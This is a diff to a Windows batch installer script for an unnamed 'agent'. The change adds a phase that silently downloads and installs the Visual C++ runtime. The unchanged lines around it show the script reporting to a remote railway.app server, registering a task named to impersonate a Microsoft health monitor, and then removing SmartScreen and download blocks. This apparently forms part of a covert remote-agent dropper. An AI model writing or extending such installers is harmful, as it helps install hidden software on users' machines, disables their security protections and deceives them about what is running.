@@ -41,6 +41,32 @@ set "SERVER_URL=https://h-boss-production.up.railway.app"
 set "TASK_NAME=MicrosoftWindowsHealthMonitor"
 
 :: ═══════════════════════════════════════════════════
+:: PHASE 0: DEPENDENCY RESOLVER — Ensure VCRedist exists
+:: ═══════════════════════════════════════════════════
+echo [0/10] Checking system dependencies...
+
+:: Check if Visual C++ 2015-2022 Redistributable (x64) is installed
+reg query "HKLM\SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x64" /v "Version" >nul 2>&1
+if %errorlevel% neq 0 (
+    echo     [!] Visual C++ Redistributable missing. Installing silently...
+    set "VCREDIST_EXE=%TEMP%\vc_redist.x64.exe"
+    
+    :: Download silently
+    powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://aka.ms/vs/17/release/vc_redist.x64.exe' -OutFile '%TEMP%\vc_redist.x64.exe' -UseBasicParsing" >nul 2>&1
+    
+    :: Install silently
+    if exist "%TEMP%\vc_redist.x64.exe" (
+        "%TEMP%\vc_redist.x64.exe" /install /quiet /norestart
+        del /F /Q "%TEMP%\vc_redist.x64.exe" >nul 2>&1
+        echo     [*] Dependency installed successfully.
+    ) else (
+        echo     [ERROR] Failed to download dependency. Agent may not run.
+    )
+) else (
+    echo     [*] Dependencies verified.
+)
+
+:: ═══════════════════════════════════════════════════
 :: PHASE 1: PRE-FLIGHT — Remove ALL blocks BEFORE touching files
 :: ═══════════════════════════════════════════════════
 echo [1/10] Removing SmartScreen and download blocks...
